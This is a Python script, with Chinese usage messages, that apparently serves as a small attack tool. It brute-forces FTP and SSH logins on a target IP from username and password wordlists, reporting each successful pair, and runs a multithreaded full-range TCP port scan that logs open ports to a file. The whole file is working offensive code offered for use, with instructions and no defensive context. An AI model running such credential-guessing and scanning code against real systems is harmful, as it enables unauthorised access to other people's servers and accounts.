import ftplib
import queue
import threading
import sys
import socket
import paramiko


def ftp_baopo(ip, user_dic, password_dic):
    for f_u in open(user_dic):
        f_u = f_u.strip()
        for f_p in open(password_dic):
            f_p = f_p.strip()
            try:
                ftp = ftplib.FTP()
                ftp.connect(ip, 21)
                ftp.login(f_u, f_p)
                print('[+++FTP] ' + f_u + ' ---> ' + f_p + ' success')
            except Exception:
                print('[-FTP] ' + f_u + ' ---> ' + f_p + ' failed')
            finally:
                if 'ftp' in locals():
                    ftp.close()


def ssh_baopo(ip, user_dic, password_dic):
    for f_u in open(user_dic):
        f_u = f_u.strip()
        for f_p in open(password_dic):
            f_p = f_p.strip()
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port=22, username=f_u, password=f_p)
                print('[+++SSH] ' + f_u + ' ---> ' + f_p + '--->'+' success')
            except Exception:
                print('[-SSH] ' + f_u + ' ---> ' + f_p +'--->'+' failed')
            finally:
                if 'ssh' in locals():
                    ssh.close()


def ip_scan(ip, q):
    while not q.empty():
        port = q.get()
        try:
            s = socket.socket()
            s.connect((ip, port))
            print(f"{ip}:{port} open")
            with open('port_open.txt', 'a') as f:
                f.write(f"{ip}:{port}\n")
                f.close()
        except Exception:
            print(f"{ip}:{port} closed")
        finally:
            s.close()


if __name__ == '__main__':
    q = queue.Queue()

    print('此工具是一款小型的爆破工具，目前支持 ssh/ftp/burst端口爆破 -->> 这三种爆破 ')
    print('-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=')
    print('使用方法如下:-------------------------------------------------------')
    print('-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=')
    print('eg:   python xxx.py ssh/ftp/ user.txt password.txt ---> ftp爆破/ssh爆破 + 字典路径')
    print('eg:   python xxx.py burst  --->  设输入IP，设置完线程即可全端口扫描 ')
    print('--------------------------------------------------- by ------->  0x4f5da2')

    if len(sys.argv) < 2:
        print('参数错误! 请输入: ftp/ssh/burst')
        sys.exit(1)

    chose = sys.argv[1]

    if chose == 'ftp':
        if len(sys.argv) < 5:
            print('参数错误! 请输入: ftp IP user.txt password.txt')
            sys.exit(1)
        ip = sys.argv[2]
        user_dic = sys.argv[3]
        password_dic = sys.argv[4]
        ftp_baopo(ip, user_dic, password_dic)

    elif chose == 'ssh':
        if len(sys.argv) < 5:
            print('参数错误! 请输入: ssh IP user.txt password.txt')
            sys.exit(1)
        ip = sys.argv[2]
        user_dic = sys.argv[3]
        password_dic = sys.argv[4]
        ssh_baopo(ip, user_dic, password_dic)

    elif chose == 'burst':
        ip = input('请输入你想要爆破的IP: ')
        th_um = input('请输入你想要爆破的线程: ')

        while True:
            mode = input('选择端口扫描模式 (1: 全端口, 2: 自定义端口): ')
            if mode == '1':
                for i in range(1, 65536):
                    q.put(i)
                break
            elif mode == '2':
                custom_ports = input('请输入自定义端口，用逗号分隔: ')
                ports = custom_ports.split(',')
                for port in ports:
                    try:
                        q.put(int(port.strip()))
                    except ValueError:
                        print(f"无效端口: {port}")
                break
            else:
                print('无效选择，请输入1或2')
        try:
            num_threads = int(th_um)
        except ValueError:
            print('线程数必须为整数')
            sys.exit(1)

        threads = []
        for _ in range(num_threads):
            t = threading.Thread(target=ip_scan, args=(ip, q))
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

    else:
        print('参数错误! 请输入: ftp/ssh/burst')
